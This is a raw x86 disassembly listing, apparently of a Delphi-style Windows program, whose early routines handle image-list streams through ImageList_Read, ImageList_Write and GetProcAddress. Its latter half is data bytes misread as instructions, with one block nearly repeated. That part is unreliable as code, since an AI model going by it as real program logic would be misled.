je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4483d0
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44851c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419bcc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_4484c0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448574
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_415bf0
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_415bf0
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4487f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4159c4
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_4159e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4487db
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423054
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412938
mov eax [ ebp - 0x4 ]
call sub_448ba0
xor eax eax
push ebp
push sub_4487be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4487c5
mov eax [ ebp - 0xc ]
call sub_403104
mov eax [ ebp - 0x14 ]
call sub_403104
mov eax [ ebp - 0x4 ]
call sub_448ba4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412960
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_422284
push eax
mov eax [ ebp - 0xc ]
call sub_422284
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d664
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412960
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422284
push eax
mov eax [ ebp - 0x14 ]
call sub_422284
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d664
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44779c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_448808
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a34c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_448868
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_447624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44886f
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub eax 0xffffffec
sub_44886f
mov eax [ ebp - 0x4 ]
call sub_44748c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44899e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4159e4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4160ec
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4159e4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403104
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4159e4
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a34c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_448981
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_4159e4
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_447624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4159e4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_4489d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_4476c4
mov eax edi
call sub_4159c4
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_4159e4
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_448574
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_448808
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_448a5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a34c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448b56
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bd70
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_447660
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_447660
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448b5d
mov eax [ ebp - 0x4 ]
call sub_403104
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
jmp r-xdata
sub_448bc4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
mov edx esi
call sub_448334
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_448c10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448c35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448c3c
retn
sub_4490a6
enter 0x44ca 0x0
enter 0x44c3 0x0
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x8c6b6365
mov es [ eax + eax + 0x3b ]
add [ eax ] al
arpl [ ebx - 0x74 ] bp
insd
mov esp 0x7004490
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
and [ eax + 0x27340044 ] dl
inc ecx
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
sub [ ecx ] al
pop esp
lds eax [ eax + eax - 0x8 ]
leave
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
outsb
jne r-xdata
popad
imul edx [ eax + edx + 0x300040 ] 0x0
jns r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
[ eax ]
lds eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
add bh bh
fadd st3
inc esp
add [ eax + 0x44cc ] dh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
mov [ esi + 0x3c0044 ] cs
add bh bh
js r-xdata
adc [ eax ] al
cmp eax 0x40ff0000

dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
xchg esp eax
mov [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
jmp [ eax - 0xfffbb3c ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
dec esp
les eax [ eax + eax - 0x30 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
js r-xdata
adc eax [ ecx ]
push esp
add [ eax ] al
call [ eax + eax ]
push [ eax ]
int 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
js r-xdata
je r-xdata
int3
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
dec [ esp + eax * 8 + 0x44 ]
add al dl
imul esi [ ebp + ebp * 2 + 0x61 ] 0x448ca070
add [ eax ] cl
add bh bh
int3
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
mov ebp 0xc9d00041
inc esp
add [ eax - 0x36 ] ch
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
jo r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
adc ch cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
dec esp
lds eax [ eax + eax + 0x50 ]
int 0x44
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
mov al [ 0xfffffffff00044c4 ]
int3
outsd
dec ecx
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
insd
mov esp 0x60004113
add [ eax ] al
[ eax + 0x700044c5 ]
cwde
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + ebx * 8 + 0x44 ] bh
add [ esp + eax * 2 ] cl
xor eax [ eax ]
sbb [ ecx + 0x33600041 ] bl
ja r-xdata
inc ecx
add al ah
xlat
inc esp
add [ eax - 0x272fffbc ] cl
inc esp
add [ eax + 0xe0044 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
les ebx [ ecx + eax * 2 + 0x419cbc00 ]
add ah ah
lahf
jb r-xdata
adc [ esp + eax * 2 + 0x4494b000 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
xchg esp eax
inc esp
add [ esi + 0x58004494 ] ah
add [ eax ] al
add [ eax ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
insd
movsb [ edi ] [ esi ]
lea eax [ eax + eax - 0x68 ]
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ edx - 0x59ffbb6c ] dl
xchg esp eax
inc esp
add [ eax ] bl
add [ eax ] al
cmp [ esi ] ah
je r-xdata
inc esp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
dec ecx
je r-xdata
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax - 0x1ebfffbc ] ah
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x7c004030
fadd [ eax + eax + 0xc ]
inc esp
jae r-xdata
insd
sbb al 0x8e
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
pushfd
inc ecx
add [ ebp + ebx * 4 - 0x6023ffbf ] ch
insd
lea eax [ eax ]
inc esp
xchg esp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4fffbb6c ] al
xchg esp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_449126
cld
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
outsb
jne r-xdata
popad
imul edx [ eax + edx + 0x300040 ] 0x0
jns r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
[ eax ]
lds eax [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
add bh bh
fadd st3
inc esp
add [ eax + 0x44cc ] dh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
mov [ esi + 0x3c0044 ] cs
add bh bh
js r-xdata
adc [ eax ] al
cmp eax 0x40ff0000

dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
xchg esp eax
mov [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
jmp [ eax - 0xfffbb3c ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
dec esp
les eax [ eax + eax - 0x30 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
js r-xdata
adc eax [ ecx ]
push esp
add [ eax ] al
call [ eax + eax ]
push [ eax ]
int 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
js r-xdata
je r-xdata
int3
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
dec [ esp + eax * 8 + 0x44 ]
add al dl
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
mov ebp 0xc9d00041
inc esp
add [ eax - 0x36 ] ch
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x448ca070
add [ eax ] cl
add bh bh
int3
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
jo r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
adc ch cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
dec esp
lds eax [ eax + eax + 0x50 ]
int 0x44
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
mov al [ 0xfffffffff00044c4 ]
int3
outsd
dec ecx
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
insd
mov esp 0x60004113
add [ eax ] al
[ eax + 0x700044c5 ]
cwde
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + ebx * 8 + 0x44 ] bh
add [ esp + eax * 2 ] cl
xor eax [ eax ]
sbb [ ecx + 0x33600041 ] bl
ja r-xdata
inc ecx
add al ah
xlat
inc esp
add [ eax - 0x272fffbc ] cl
inc esp
add [ eax + 0xe0044 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
les ebx [ ecx + eax * 2 + 0x419cbc00 ]
add ah ah
lahf
jb r-xdata
adc [ esp + eax * 2 + 0x4494b000 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
xchg esp eax
inc esp
add [ esi + 0x58004494 ] ah
add [ eax ] al
add [ eax ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
insd
movsb [ edi ] [ esi ]
lea eax [ eax + eax - 0x68 ]
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ edx - 0x59ffbb6c ] dl
xchg esp eax
inc esp
add [ eax ] bl
add [ eax ] al
cmp [ esi ] ah
je r-xdata
inc esp
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
dec ecx
je r-xdata
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax - 0x1ebfffbc ] ah
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x7c004030
fadd [ eax + eax + 0xc ]
inc esp
jae r-xdata
insd
sbb al 0x8e
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
pushfd
inc ecx
add [ ebp + ebx * 4 - 0x6023ffbf ] ch
insd
lea eax [ eax ]
inc esp
xchg esp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4fffbb6c ] al
xchg esp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4492fa
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xbc6d6574
adc eax [ ecx ]
pushad
add [ eax ] al
[ eax + 0x700044c5 ]
sub_4494f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ eax + eax + 0x5 ]
push esp
dec ebp
outsb
jne r-xdata
inc esp
add [ eax ] ah
add [ eax ] al
clc
xchg ebx eax
inc esp
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + ebx * 8 + 0x44 ] bh
add [ esp + eax * 2 ] cl
popfd
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add al ah
xlat
inc esp
add [ eax - 0x272fffbc ] cl
inc esp
add [ eax + 0xe0044 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
xchg esp eax
inc esp
add [ edi ] al
add eax 0x6e654d54
jne r-xdata
add [ eax - 0x1b ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add ah dl
mov es [ eax + eax + 0x60 ]
in eax 0x44
test [ ebp + 0x44 ] dl
xchg esp eax
inc esp
add [ edi ] dh
inc ecx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5c65646f
dec eax
outsd
je r-xdata
mov eax 0x34004490
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
add [ eax + 0x34004490 ] bh
inc eax
add [ ecx ] al
add bh bh
cld
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] cl
add bh bh
add al 0xe1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
jns r-xdata
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add al ah
xlat
inc esp
add [ eax - 0x1983ffbc ] cl
inc esp
add al al
in eax 0x44
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rol [ ebp + edx * 4 + 0x9070044 ] 0x54
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x38756e65
xchg ebp eax
inc esp
add [ esp + edx * 4 + 0xb0044 ] ch
add eax 0x756e654d
jae r-xdata
mov ah 0x9c
inc ecx
add [ ebp + ebx * 4 - 0x6023ffbf ] ch
insd
jae r-xdata
je r-xdata
outsb
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
dec eax
fild [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jb r-xdata
pop esp
aam 0x8e
inc esp
add [ eax - 0x6fffbb1b ] al
in eax 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
add al dl
fadd [ eax + eax - 0x44 ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add [ eax ] bh
xchg ebp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
